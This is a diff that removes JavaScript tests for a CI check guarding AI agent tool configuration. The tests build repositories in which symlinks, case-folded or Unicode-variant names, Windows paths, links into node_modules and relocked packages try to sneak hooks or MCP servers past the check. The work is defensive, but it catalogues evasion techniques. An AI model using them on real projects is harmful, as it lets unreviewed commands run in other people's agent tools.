-    fs.symlinkSync("../../docs/a", path.join(twin, ".claude/Skills/foo"));
-    git(twin, "add", "-A"); git(twin, "commit", "-q", "-m", "a skill linked in");
-    git(twin, "checkout", "-q", "-B", "change2"); fs.unlinkSync(path.join(twin, ".claude/Skills/foo"));
-    fs.symlinkSync("../../docs/b", path.join(twin, ".claude/Skills/foo"));
-    git(twin, "add", "-A"); git(twin, "commit", "-q", "-m", "the link moved");
-    git(twin, "checkout", "-q", "main"); git(twin, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-    fails(run(twin), "and so does a skill's link moved to a folder whose SKILL.md is the same", "Mend: rename it to .claude/skills");
-    // (a link whose target the commit holds only in another case, which a file system that ignores case follows)
-    const LINK_SAYS = "in another case, which an agent tool reads there";
-    for (const [at, to, file] of [[".kiro/settings", "../Inner", "inner/mcp.json"], [".claude/skills/s", "../../Sk", "sk/SKILL.md"], [".mcp.json", "Real.json", "real.json"]]) {
-      const caseLink = project({ [file]: "{}\n", ...listing() });
-      fs.mkdirSync(path.dirname(path.join(caseLink, at)), { recursive: true });
-      fs.symlinkSync(to, path.join(caseLink, at));
-      git(caseLink, "add", "-A"); git(caseLink, "commit", "-q", "-m", "a link in another case");
-      fails(run(caseLink, "--core"), `${at} linked to ${to}, held as ${file.split("/")[0]}, fails`, `${at} leads, through a link, to`, LINK_SAYS, "Mend: write the link's target as");
-    }
-    const caseHeld = project({ "inner/mcp.json": "{}\n", ...listing() });
-    fs.mkdirSync(path.join(caseHeld, ".kiro"), { recursive: true });
-    fs.symlinkSync("../Inner", path.join(caseHeld, ".kiro/settings"));
-    git(caseHeld, "add", "-A"); git(caseHeld, "commit", "-q", "-m", "a link in another case");
-    const caseKept = run(pr(caseHeld, { "README.md": "a change of its own\n" }));
-    ok(caseKept.status === 0 && caseKept.out.includes(LINK_SAYS), "one the base held is noted, not failed", caseKept.out);
-    fails(run(pr(caseHeld, { "inner/mcp.json": "{ \"mcpServers\": {} }\n" })), "but not once what stands under its target changes", LINK_SAYS);
-    passes(run(pr(project({ "Inner/mcp.json": "{}\n", ...listing() }), { "README.md": "x\n" })), "a folder in another case that no link leads to is none of this");
-    // (#633's fallback security review of acf5691: where a link's target stands in no case but folds alike to a folder
-    // and a link beside it, the one the listing gives first is read, as before the names were folded once a folder)
-    const order = () => { const dir = project({ "CONF/settings.json": KIT, "other/settings.json": KIT, ...listing() }); fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.symlinkSync("conf", path.join(dir, ".claude")); fs.symlinkSync("other", path.join(dir, "Conf")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link to a name in no case"); return dir; };
-    fails(run(pr(order(), { "other/settings.json": JSON.stringify({ ...JSON.parse(KIT), hooks: { ...JSON.parse(KIT).hooks, SessionStart: [{ hooks: [{ type: "command", command: "bash scripts/x.sh" }] }] } }) })), "a hook added where a link to a name in no case leads, through a link beside a folder of that name, fails", ".claude");
-    // (a target the commit holds under two names that fold alike, which a file system that ignores case keeps one of)
-    const SEVERAL = "under more than one name a file system that ignores case reads as one";
-    const twice = () => { const dir = project({ "Cfg/settings/mcp.json": "{}\n", "cfg/settings/mcp.json": "{}\n", ...listing() }); fs.symlinkSync("Cfg", path.join(dir, ".kiro")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link to a name held twice"); return dir; };
-    fails(run(twice(), "--core"), "a link to a name the commit holds twice, folded alike, fails", `leads, through a link, to Cfg, which the commit holds ${SEVERAL} (Cfg, cfg)`, "Mend: keep one of those names");
-    const twiceKept = run(pr(twice(), { "README.md": "x\n" }));
-    ok(twiceKept.status === 0 && twiceKept.out.includes(SEVERAL), "one the base held is noted, not failed", twiceKept.out);
-    fails(run(pr(twice(), { "cfg/settings/mcp.json": "{ \"mcpServers\": {} }\n" })), "but not once what the tool may read under the other name changes", SEVERAL);
-    // (Codex's code review of a2ed364: held by what a tool may read under each name alone, so what else stands there
-    // changes freely, while a tool's file changed or added under either name fails)
-    const twiceDoc = run(pr(twice(), { "Cfg/README.md": "x\n", "cfg/notes.txt": "y\n" }));
-    ok(twiceDoc.status === 0 && twiceDoc.out.includes(SEVERAL), "one the base held is noted while what no tool reads under either name changes", twiceDoc.out);
-    fails(run(pr(twice(), { "Cfg/settings/mcp.json": "{ \"mcpServers\": {} }\n" })), "but not once what the tool may read under the name git keeps changes", SEVERAL);
-    // (a link below agents to a name the commit holds as a file and as a folder in another case, which a checkout that
-    // ignores case may give as the folder: held by the Markdown files below that folder too)
-    const fileAndFolder = () => { const dir = project({ "lib/d": "a file\n", "lib/D/b.md": "# b\n", ...listing() }); fs.mkdirSync(path.join(dir, ".claude/agents"), { recursive: true }); fs.symlinkSync("../../lib/d", path.join(dir, ".claude/agents/x")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link to a file and a folder that fold alike"); return dir; };
-    fails(run(pr(fileAndFolder(), { "lib/D/b.md": "---\nname: b\npermissionMode: default\n---\n" })), "a link the base held below agents to a file and a folder of another case fails once a Markdown file in the folder changes", SEVERAL);
-    fails(run(pr(fileAndFolder(), { "lib/D/deep/c.MD": "# c\n" })), "and once one is added there, at any depth", SEVERAL);
-    const bothKept = run(pr(fileAndFolder(), { "lib/D/notes.txt": "x\n" }));
-    ok(bothKept.status === 0 && bothKept.out.includes(SEVERAL), "and is noted while only what Claude Code does not read there changes", bothKept.out);
-    // (#706's fallback security review of 622669e: held by all a link in that folder leads to as well, and found as
-    // Windows reads a link's text too)
-    const deeper = fileAndFolder(); write(deeper, "other/a.md", "# a\n"); fs.symlinkSync("../../other", path.join(deeper, "lib/D/y")); git(deeper, "add", "-A"); git(deeper, "commit", "-q", "-m", "a link in the folder");
-    fails(run(pr(deeper, { "other/new.md": "---\nname: new\npermissionMode: default\n---\n" })), "and once Markdown is added where a link in that folder leads", SEVERAL);
-    const winTwin = () => { const dir = project({ "lib/d": "a file\n", "lib/D/b.md": "# b\n", ...listing() }); fs.mkdirSync(path.join(dir, ".claude/agents"), { recursive: true }); fs.symlinkSync("..\\..\\lib\\d", path.join(dir, ".claude/agents/x")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a Windows link to a file and a folder that fold alike"); return dir; };
-    fails(run(pr(winTwin(), { "lib/D/b.md": "---\nname: b\npermissionMode: default\n---\n" })), "and so does one whose text only Windows reads, once a Markdown file in the folder changes", SEVERAL);
-    const winTwinKept = run(pr(winTwin(), { "README.md": "x\n" }));
-    ok(winTwinKept.status === 0 && winTwinKept.out.includes(SEVERAL), "and is noted while nothing there changes", winTwinKept.out);
-    fails(run(pr(twice(), { "Cfg/hooks/lint.json": JSON.stringify({ version: "v1", hooks: [] }) })), "nor once a hook file is added under the name git keeps", SEVERAL);
-    // (its fallback security review of f8559d9: and under each spelling of each name past the first held twice)
-    const twiceDeep = () => { const dir = project({ "A/b/settings/mcp.json": "{}\n", "a/b/settings/mcp.json": "{}\n", "A/B/hooks/n.txt": "x\n", "A/B/settings/mcp.json": "{}\n", ...listing() }); fs.symlinkSync("A/b", path.join(dir, ".kiro")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link through names held twice"); return dir; };
-    fails(run(pr(twiceDeep(), { "A/B/hooks/new.json": JSON.stringify({ version: "v1", hooks: [] }) })), "a hook file added under another spelling of a name past the first held twice fails", SEVERAL);
-    fails(run(pr(twiceDeep(), { "A/B/settings/mcp.json": "{ \"mcpServers\": {} }\n" })), "and so does a tool's file changed there", SEVERAL);
-    const manyWays = project({ "A/xy/k": "x\n", "A/xY/k": "x\n", "A/Xy/k": "x\n", "A/XY/k": "x\n", "a/k": "x\n", ...listing() });
-    fs.symlinkSync(`A/${"xy/../".repeat(10)}xy`, path.join(manyWays, ".kiro")); git(manyWays, "add", "-A"); git(manyWays, "commit", "-q", "-m", "a link through many spellings");
-    const waysStarted = Date.now(), waysKept = run(pr(manyWays, { "README.md": "x\n" }));
-    ok(waysKept.status === 0 && waysKept.out.includes(SEVERAL) && Date.now() - waysStarted < 30000, "a link the base held through many spellings of each step is read in seconds, each place once", `${Date.now() - waysStarted} ms\n${waysKept.out.slice(0, 1500)}`);
-    const kiroHook = command => ({ version: "v1", hooks: [{ name: "lint", trigger: "Stop", action: { type: "command", command } }] });
-    // (a hook file added under the other name, where no tool's path the walk takes passes, is held all the same; and a
-    // link to a folder held twice is seen where no tool's file stands under the name git keeps, or where the name it
-    // names stands in no case but two others)
-    fails(run(pr(twice(), { "cfg/hooks/lint.json": kiroHook("bash scripts/run.sh") })), "and so does a hook file added under the other name", SEVERAL);
-    // (#633's code review of de3cb32: and a tool's file the other name alone holds, added)
-    const twiceClaude = () => { const dir = project({ "Cfg/settings.json": KIT, "cfg/settings.json": KIT, ...listing() }); fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.symlinkSync("Cfg", path.join(dir, ".claude")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link to a name held twice"); return dir; };
-    fails(run(pr(twiceClaude(), { "cfg/settings.local.json": JSON.stringify({ apiKeyHelper: "bash scripts/key.sh" }) })), "and so does a settings file only the other name holds, added", SEVERAL);
-    const bare = project({ "Cfg/x": "x\n", "cfg/hooks/lint.json": kiroHook("bash scripts/run.sh"), ...listing() });
-    fs.symlinkSync("Cfg", path.join(bare, ".kiro")); git(bare, "add", "-A"); git(bare, "commit", "-q", "-m", "a link to a folder held twice");
-    fails(run(bare, "--core"), "a link to a folder held twice fails where no tool's file stands under the name git keeps", SEVERAL);
-    const neither = project({ "Cfg/settings/mcp.json": "{}\n", "CFG/settings/mcp.json": "{}\n", ...listing() });
-    fs.symlinkSync("cfg", path.join(neither, ".kiro")); git(neither, "add", "-A"); git(neither, "commit", "-q", "-m", "a link to a name in no case");
-    fails(run(neither, "--core"), "and so does one to a name that stands in no case but two others", SEVERAL);
-    // (and a target in another of Unicode's normal forms, which macOS's file system reads as the same)
-    const nfd = project({ ["cf\u0065\u0301/settings/mcp.json"]: "{}\n", ...listing() });
-    fs.symlinkSync("cf\u00e9", path.join(nfd, ".kiro"));
-    git(nfd, "add", "-A"); git(nfd, "commit", "-q", "-m", "a link to a name in another normal form");
-    fails(run(nfd, "--core"), "a link to a name the commit holds in another normal form fails", ".kiro leads, through a link, to", LINK_SAYS);
-    // (#600's code review of 09ed8b5: a tool's folder in another case, itself a link whose target stands only in another
-    // case, the base holding both, and what stands under that target changed)
-    const both = project({ "cfg/config.toml": "# none\n", ...listing() });
-    fs.symlinkSync("CFG", path.join(both, ".Codex"));
-    git(both, "add", "-A"); git(both, "commit", "-q", "-m", "a link in another case to a target in another case");
-    fails(run(pr(both, { "cfg/config.toml": "notify = [\"bash\", \"new.sh\"]\n" })), "and so does one the base held whose tool's folder is in another case too", LINK_SAYS);
-    // (#618's code review of 1e710c8: held by what the tool reads there alone, so a file beside it changes nothing)
-    const besideCase = run(pr(both, { "cfg/notes.md": "x\n" }));
-    ok(besideCase.status === 0 && besideCase.out.includes(LINK_SAYS), "a file there no tool reads, added, changes nothing the base held", besideCase.out);
-    // (a link the base held that leads out of the checkout, as one through a folder CI's checkout lacks does, is held by
-    // what its path reaches in the commit too)
-    const throughIgnored = project({ ".gitignore": "node_modules/\n", "kreal/settings/mcp.json": "{}\n", ...listing() });
-    fs.symlinkSync("node_modules/../kreal", path.join(throughIgnored, ".kiro"));
-    git(throughIgnored, "add", "-A"); git(throughIgnored, "commit", "-q", "-m", "a link through an ignored folder");
-    const outKept = run(pr(throughIgnored, { "README.md": "x\n" }));
-    ok(outKept.status === 0 && outKept.out.includes("as the base held it"), "a link out the base held is noted while what its path reaches stands", outKept.out);
-    fails(run(pr(throughIgnored, { "kreal/settings/mcp.json": JSON.stringify({ mcpServers: { files: { command: "npx", args: ["-y", "files@1.0.0"] } } }) })), "but not once what it reaches changes", '".kiro" is a link that leads out of the checkout');
-    // (#618's code review of 4d141c6: only what a tool reads there, so a file beside it, or a link that reaches the
-    // checkout's root, changes nothing the base held)
-    const besideRead = run(pr(throughIgnored, { "kreal/notes.md": "x\n" }));
-    ok(besideRead.status === 0 && besideRead.out.includes("as the base held it"), "a file there no tool reads, changed, changes nothing the base held", besideRead.out);
-    const toRoot = project({ ".gitignore": "node_modules/\n", ...listing() });
-    fs.rmSync(path.join(toRoot, ".codex"), { recursive: true, force: true });
-    fs.symlinkSync("node_modules/..", path.join(toRoot, ".codex"));
-    git(toRoot, "add", "-A"); git(toRoot, "commit", "-q", "-m", "a link through an ignored folder to the root");
-    const rootKept = run(pr(toRoot, { "README.md": "an unrelated change\n" }));
-    ok(rootKept.status === 0 && rootKept.out.includes("as the base held it"), "and so does an unrelated change where a held link reaches the checkout's root", rootKept.out);
-    // (#618's fallback security review of 1e710c8: a link or submodule on the way to what a tool reads there, and what a
-    // link under it leads to, are held too)
-    const underLink = (setup, change, says) => {
-      const dir = project({ ".gitignore": "node_modules/\n", ...listing() });
-      fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true });
-      setup(dir);
-      git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link out through an ignored folder");
-      git(dir, "checkout", "-q", "-B", "change2"); change(dir);
-      git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "changed");
-      git(dir, "checkout", "-q", "main"); git(dir, "merge", "-q", "--no-ff", "-m", "merge", "change2");
-      fails(run(dir), says, '".claude" is a link that leads out of the checkout');
-    };
-    const skillAt = (dir, folder) => { fs.mkdirSync(path.join(dir, folder, "x"), { recursive: true }); fs.writeFileSync(path.join(dir, folder, "x/SKILL.md"), `# ${folder}\n`); };
-    underLink(dir => { fs.mkdirSync(path.join(dir, "cl"), { recursive: true }); fs.writeFileSync(path.join(dir, "cl/settings.json"), KIT); skillAt(dir, "s1"); skillAt(dir, "s2"); fs.symlinkSync("../s1", path.join(dir, "cl/skills")); fs.symlinkSync("node_modules/../cl", path.join(dir, ".claude")); },
-      dir => { fs.unlinkSync(path.join(dir, "cl/skills")); fs.symlinkSync("../s2", path.join(dir, "cl/skills")); }, "a link under a held link out, moved, fails");
-    underLink(dir => { fs.mkdirSync(path.join(dir, "cl"), { recursive: true }); fs.writeFileSync(path.join(dir, "cl/settings.json"), KIT); skillAt(dir, "s1"); fs.symlinkSync("../s1", path.join(dir, "cl/skills")); fs.symlinkSync("node_modules/../cl", path.join(dir, ".claude")); },
-      dir => fs.writeFileSync(path.join(dir, "s1/x/SKILL.md"), "# changed\n"), "and so does what a link under it leads to, changed");
-    // (#618's fallback security review of 8ff37cf: and what it leads to in another case, as a file system that ignores case
-    // finds it)
-    underLink(dir => { fs.mkdirSync(path.join(dir, "cl"), { recursive: true }); fs.writeFileSync(path.join(dir, "cl/settings.json"), KIT); fs.symlinkSync("node_modules/../CL", path.join(dir, ".claude")); },
-      dir => fs.writeFileSync(path.join(dir, "cl/settings.json"), JSON.stringify({ ...JSON.parse(KIT), model: "opus" })), "and so does what it leads to in another case, changed");
-    // (a link to what the commit does not hold, a folder an install fills or a place outside the checkout: this check
-    // cannot read it, so a new one fails, and one the base held is reported, never failed, whatever else changes, as
-    // what a project held before a check read more is (core archive 207))
-    const UNHELD = "to what the commit does not hold";
-    const lockAt = version => JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version } } });
-    const linkTo = (target, files = {}) => { const dir = project({ ".gitignore": "node_modules/\n.venv/\n", "package-lock.json": lockAt("1.0.0"), ...files, ...listing() }); fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.symlinkSync(target, path.join(dir, ".claude")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link"); return dir; };
-    const added = target => { const dir = project({ ".gitignore": "node_modules/\n.venv/\n", ...listing() }); fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "no link yet"); git(dir, "checkout", "-q", "-B", "change"); fs.symlinkSync(target, path.join(dir, ".claude")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link"); git(dir, "checkout", "-q", "main"); git(dir, "merge", "-q", "--no-ff", "-m", "merge", "change"); return dir; };
-    for (const target of ["node_modules/pkg/.claude", "Node_Modules/pkg/.claude", ".venv/lib/pkg/.claude", "node_modules", "../outside/.claude", "app/node_modules/pkg/.claude"]) {
-      fails(run(added(target)), `a link added to ${target} fails`, UNHELD, "Mend: replace the link with the file or folder itself");
-      const kept = run(pr(linkTo(target), { "README.md": "x\n" }));
-      ok(kept.status === 0 && kept.out.includes(UNHELD) && kept.out.includes("reported, never failed"), `one the base held, to ${target}, is reported, never failed, while its package is locked as before`, kept.out);
-      // (and where the pull request locks the package it leads into anew, by its own entry in the lock file, what a tool
-      // runs there changes: it fails; through no node_modules, it stays reported whatever the lock says)
-      const key = { "node_modules/pkg/.claude": "node_modules/pkg", "Node_Modules/pkg/.claude": "node_modules/pkg", "app/node_modules/pkg/.claude": "app/node_modules/pkg" }[target];
-      const relocked = run(pr(linkTo(target), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, [key ?? "node_modules/pkg"]: { version: "2.0.0" } } }) }));
-      if (key) fails(relocked, `but one to ${target} fails once its package is locked anew`, "locks the package it leads into anew", "Mend: replace the link with the file or folder itself, committed in the project, or take it out");
-      else ok(relocked.status === 0 && relocked.out.includes("reported, never failed"), `while one to ${target}, through no package an entry names, stays reported whatever the lock says`, relocked.out);
-    }
-    // (its fallback security review of 7e403ef: the entry found in whatever case; a workspace's package by all its folder
-    // holds; a lock read through a link; and what no entry can be read of exactly, reported)
-    fails(run(pr(linkTo("node_modules/Pkg/.claude"), { "package-lock.json": lockAt("2.0.0") })), "one to a package in another case fails once its entry, found in whatever case, changes", "locks the package it leads into anew");
-    const workspace = () => linkTo("node_modules/m/.claude", { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/m": { resolved: "packages/m", link: true } } }), "packages/m/package.json": "{}\n", "packages/m/.claude/settings.json": KIT });
-    fails(run(pr(workspace(), { "packages/m/.claude/settings.json": JSON.stringify({ ...JSON.parse(KIT), model: "opus" }) })), "one to a workspace's package fails once that package's own folder changes", "locks the package it leads into anew");
-    // (its fallback security review of 91b8a02: and where that folder is itself a link into node_modules, by what the
-    // lock says of where it leads; while a flag of the entry's alone, which npm sets anew as others change, changes nothing)
-    const viaMember = () => { const dir = linkTo("node_modules/m/.claude", { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/m": { resolved: "packages/m", link: true }, "node_modules/evil": { version: "1.0.0" } } }) }); fs.mkdirSync(path.join(dir, "packages"), { recursive: true }); fs.symlinkSync("../node_modules/evil", path.join(dir, "packages/m")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a member that is a link"); return dir; };
-    fails(run(pr(viaMember(), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/m": { resolved: "packages/m", link: true }, "node_modules/evil": { version: "2.0.0" } } }) })), "one fails where a workspace's folder is a link into node_modules and what it leads to is locked anew", "locks the package it leads into anew");
-    // (its fallback security review of 4a92b34: a workspace's folder that links back to it again and again is read once
-    // each, in seconds; and a package bundled in its parent's is held by the parent's entry too)
-    const loops = () => { const dir = linkTo("node_modules/m/.claude", { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/m": { resolved: "packages/m", link: true } } }), "packages/m/.claude/settings.json": KIT }); for (let k = 0; k < 6; k++) fs.symlinkSync("../../node_modules/m", path.join(dir, `packages/m/l${k}`)); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "links back"); return dir; };
-    const loopsStart = Date.now(), loopsRun = run(pr(loops(), { "README.md": "x\n" }));
-    ok([0, 1].includes(loopsRun.status) && Date.now() - loopsStart < 30000, "a workspace's folder of links back to it is read in seconds", `${Date.now() - loopsStart} ms\n${loopsRun.out.slice(0, 1500)}`);
-    const bundled = version => ({ "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/a": { version, resolved: `https://example.invalid/a-${version}.tgz`, integrity: `sha512-${version}` }, "node_modules/a/node_modules/b": { version: "1.0.0", inBundle: true } } }) });
-    fails(run(pr(linkTo("node_modules/a/node_modules/b/.claude", bundled("1.0.0")), bundled("1.0.1"))), "one into a package bundled in another fails once its parent is locked anew", "locks the package it leads into anew");
-    // (its fallback security review of f6532ec: a chain past eight links deep, read to no end, is reported as one whose
-    // package may have changed; and two keys that fold alike, which a file system that ignores case reads as one folder)
-    const chainLock = last => { const packages = { "": {} }; for (let k = 0; k < 10; k++) packages[`node_modules/m${k}`] = { resolved: `packages/m${k}`, link: true }; packages["node_modules/evil"] = { version: last }; return { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages }) }; };
-    const memberChain = () => { const dir = linkTo("node_modules/m0/.claude", chainLock("1.0.0")); fs.mkdirSync(path.join(dir, "packages"), { recursive: true }); for (let k = 0; k < 10; k++) fs.symlinkSync(k < 9 ? `../node_modules/m${k + 1}` : "../node_modules/evil", path.join(dir, `packages/m${k}`)); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a chain of members"); return dir; };
-    const deep = run(pr(memberChain(), chainLock("2.0.0")));
-    ok(deep.status === 1 || deep.out.includes("may have changed"), "a chain past eight links deep, its last package locked anew, fails or is reported as one that may have changed, never as locked as before", deep.out);
-    const twoKeys = run(pr(linkTo("node_modules/pkg/.claude"), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version: "1.0.0" }, "node_modules/PKG": { version: "6.6.6" } } }) }));
-    fails(twoKeys, "a second key that folds alike, added, fails: which of the two is installed is no longer plain", "locks the package it leads into anew");
-    const entryAt = (resolved, integrity) => ({ "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version: "1.0.0", resolved, integrity } } }) });
-    const hostMoved = run(pr(linkTo("node_modules/pkg/.claude", entryAt("https://registry.example.invalid/pkg-1.0.0.tgz", "sha512-same")), entryAt("https://mirror.example.invalid/pkg-1.0.0.tgz", "sha512-same")));
-    ok(hostMoved.status === 0 && hostMoved.out.includes("may have changed"), "one whose package's entry moves to another host with the same integrity is reported, never failed", hostMoved.out);
-    fails(run(pr(linkTo("node_modules/pkg/.claude", entryAt("https://registry.example.invalid/pkg-1.0.0.tgz", "sha512-same")), entryAt("https://registry.example.invalid/pkg-1.0.0.tgz", "sha512-other"))), "while one whose integrity changes fails", "locks the package it leads into anew");
-    // (Codex's code review of 7e403ef: one that leaves the checkout and comes back in to node_modules is read by the
-    // checkout's own lock)
-    const backIn = how => { const dir = linkTo("node_modules/pkg/.claude"); fs.unlinkSync(path.join(dir, ".claude")); fs.symlinkSync(how(fs.realpathSync(dir)), path.join(dir, ".claude")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "a link out and back in"); return dir; };
-    for (const [what, how] of [["by ..", dir => `../${path.basename(dir)}/node_modules/pkg/.claude`], ["by a whole path", dir => `${dir}/node_modules/pkg/.claude`]]) {
-      fails(run(pr(backIn(how), { "package-lock.json": lockAt("2.0.0") })), `one that comes back into the checkout ${what} fails once its package is locked anew`, "locks the package it leads into anew");
-    }
-    const plainOut = run(pr(linkTo("../shared/.claude"), { "README.md": "x\n" }));
-    ok(plainOut.status === 0 && !plainOut.out.includes("may have changed") && plainOut.out.includes("reported, never failed"), "one to a folder outside the checkout through no node_modules keeps its plain note, saying nothing of a lock", plainOut.out);
-    const nmOut = run(pr(linkTo("../shared/node_modules/pkg/.claude"), { "README.md": "x\n" }));
-    ok(nmOut.status === 0 && nmOut.out.includes("may have changed"), "while one outside it through a node_modules folder, whose lock is not read, is reported as one that may have changed", nmOut.out);
-    const flagged = run(pr(linkTo("node_modules/pkg/.claude"), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version: "1.0.0", dev: true } } }) }));
-    ok(flagged.status === 0 && flagged.out.includes("locked as before"), "while a flag of its entry's alone, set anew, leaves it a note", flagged.out);
-    const lockLink = () => { const dir = linkTo("node_modules/pkg/.claude", { "locks/package-lock.json": lockAt("1.0.0") }); fs.rmSync(path.join(dir, "package-lock.json")); fs.symlinkSync("locks/package-lock.json", path.join(dir, "package-lock.json")); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "the lock as a link"); return dir; };
-    fails(run(pr(lockLink(), { "locks/package-lock.json": lockAt("2.0.0") })), "one fails where the lock it is read by is a link and what it leads to locks the package anew", "locks the package it leads into anew");
-    for (const [what, files, change] of [["its package.json", { "package.json": "{}\n" }, { "package.json": JSON.stringify({ dependencies: { pkg: "github:example/pkg" } }) }], ["a scope's folder it leads to, locked anew", {}, { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/@s/pkg": { version: "2.0.0" } } }) }]]) {
-      const loose = run(pr(linkTo(what.startsWith("a scope") ? "node_modules/@s" : "node_modules/pkg/.claude", files), change));
-      ok(loose.status === 0 && loose.out.includes("may have changed what an agent tool runs there"), `one is reported, never failed, where ${what} changes`, loose.out);
-    }
-    const otherLocked = run(pr(linkTo("node_modules/pkg/.claude"), { "package-lock.json": JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/pkg": { version: "1.0.0" }, "node_modules/other": { version: "2.0.0" } } }) }));
-    ok(otherLocked.status === 0 && otherLocked.out.includes("reported, never failed"), "a link the base held into a package stays reported while another package is locked anew", otherLocked.out);
-    // (a lock file whose entry for the package no reader here reads exactly, a yarn, pnpm or bun lock, changed: reported
-    // as one whose package may have changed, never failed, so another dependency's update fails nothing)
-    for (const [lock, before, after] of [["yarn.lock", "pkg@1:\n  version 1.0.0\n", "pkg@1:\n  version 1.0.1\n"], ["pnpm-lock.yaml", "packages:\n  pkg@1.0.0: {}\n", "packages:\n  pkg@1.0.1: {}\n"], ["bun.lock", "{ \"packages\": { \"pkg\": [\"pkg@1.0.0\"] } }\n", "{ \"packages\": { \"pkg\": [\"pkg@1.0.1\"] } }\n"]]) {
-      const loose = run(pr(linkTo("node_modules/pkg/.claude", { [lock]: before }), { [lock]: after }));
-      ok(loose.status === 0 && loose.out.includes("may have changed what an agent tool runs there") && loose.out.includes("Replace the link with the file or folder itself"), `a link the base held into a package is reported, never failed, where its ${lock} changes`, loose.out);
-    }
-    const moved = linkTo("node_modules/pkg/.claude");
-    git(moved, "checkout", "-q", "-B", "change"); fs.unlinkSync(path.join(moved, ".claude")); fs.symlinkSync("node_modules/other/.claude", path.join(moved, ".claude"));
-    git(moved, "add", "-A"); git(moved, "commit", "-q", "-m", "moved"); git(moved, "checkout", "-q", "main"); git(moved, "merge", "-q", "--no-ff", "-m", "merge", "change");
-    fails(run(moved), "but a link the base held, moved, is new", UNHELD);
-    fails(run(pr(linkTo("node_modules/pkg/.claude"), { "README.md": "x\n" }), "--core"), "and in the core's own repository one the base held fails as well", UNHELD);
-    // (#693's fallback security review of 5fe85c6: one the base held to what the commit holds, made by the pull request
-    // to lead away by a link further along, or one whose link further along the pull request moves, is new)
-    const swap = (build, change) => { const dir = project({ ".gitignore": "node_modules/\n", ...listing() }); build(dir); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "base"); git(dir, "checkout", "-q", "-B", "change"); change(dir); git(dir, "add", "-A"); git(dir, "commit", "-q", "-m", "change"); git(dir, "checkout", "-q", "main"); git(dir, "merge", "-q", "--no-ff", "-m", "merge", "change"); return dir; };
-    fails(run(swap(dir => { fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.mkdirSync(path.join(dir, "cfg/agents"), { recursive: true }); fs.writeFileSync(path.join(dir, "cfg/settings.json"), KIT); fs.writeFileSync(path.join(dir, "cfg/agents/a.md"), "---\nname: a\n---\n"); fs.symlinkSync("cfg", path.join(dir, ".claude")); },
-      dir => { fs.rmSync(path.join(dir, "cfg"), { recursive: true, force: true }); fs.symlinkSync("node_modules/evil", path.join(dir, "cfg")); })), "a link the base held to what the commit holds, made to lead away by a link further along, is new", UNHELD);
-    fails(run(swap(dir => { fs.mkdirSync(path.join(dir, "conf"), { recursive: true }); fs.rmSync(path.join(dir, ".claude/settings.json")); fs.symlinkSync("../conf/settings.json", path.join(dir, ".claude/settings.json")); fs.rmSync(path.join(dir, "conf"), { recursive: true }); fs.symlinkSync("node_modules/a", path.join(dir, "conf")); },
-      dir => { fs.unlinkSync(path.join(dir, "conf")); fs.symlinkSync("node_modules/evil", path.join(dir, "conf")); })), "and so is one whose link further along the pull request moves", UNHELD);
-    // (#693's fallback security review of d10aea8: one whose way leaves the checkout and comes back in, by ".." or a whole
-    // path, or that Windows reads otherwise, by a backslash or past forty links, is held by all of that way)
-    const self = dir => path.basename(fs.realpathSync(dir));
-    const intoCfg = to => dir => { fs.rmSync(path.join(dir, ".claude"), { recursive: true, force: true }); fs.mkdirSync(path.join(dir, "cfg"), { recursive: true }); fs.writeFileSync(path.join(dir, "cfg/settings.json"), KIT); fs.symlinkSync(to(dir), path.join(dir, ".claude")); };
-    const cfgAway = dir => { fs.rmSync(path.join(dir, "cfg"), { recursive: true, force: true }); fs.symlinkSync("node_modules/evil", path.join(dir, "cfg")); };
-    fails(run(swap(intoCfg(dir => `../${self(dir)}/cfg`), cfgAway)), "a link the base held that leaves the checkout and comes back in, made to lead away further along, is new", UNHELD);
-    fails(run(swap(intoCfg(dir => path.join(fs.realpathSync(dir), "cfg")), cfgAway)), "and so is one to a whole path into the checkout", UNHELD);
-    fails(run(swap(dir => { intoCfg(() => "cfg\\x")(dir); fs.mkdirSync(path.join(dir, "cfg/x")); fs.renameSync(path.join(dir, "cfg/settings.json"), path.join(dir, "cfg/x/settings.json")); }, cfgAway)), "and so is one whose way Windows reads by a backslash", UNHELD);
